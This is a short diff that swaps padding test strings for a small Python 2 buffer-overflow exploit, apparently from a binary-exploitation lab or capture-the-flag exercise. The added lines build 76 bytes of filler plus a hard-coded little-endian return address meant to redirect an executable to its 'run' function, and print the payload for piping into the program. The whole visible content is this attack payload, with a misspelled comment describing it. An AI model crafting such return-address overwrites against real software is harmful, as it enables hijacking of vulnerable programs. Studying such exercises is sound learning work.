@@ -1,2 +1,4 @@
-aaaabbbbcccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwww
-aaaabbbbcccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrss
+create this python exploit wich add the address of run function to str wich will be passed later to the excutable 
+str = "0123456789012345678901234567890123456789012345678901234567890123456789012345"
+str += "\x44\x84\x04\x08"
+print str
